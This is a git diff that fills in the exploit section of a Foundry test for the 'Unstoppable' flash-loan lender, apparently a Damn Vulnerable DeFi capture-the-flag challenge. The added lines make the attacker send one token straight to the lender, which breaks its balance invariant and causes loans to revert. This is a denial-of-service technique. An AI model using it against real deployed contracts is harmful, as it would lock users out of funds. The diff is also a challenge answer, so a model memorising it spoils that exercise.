@@ -56,6 +56,13 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // `poolBalance` gets updated only when deposited using `depositTokens()`
+        // It is always possible to forcibly send ether or erc20 to an address(https://swcregistry.io/docs/SWC-132)
+
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 1);
+
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
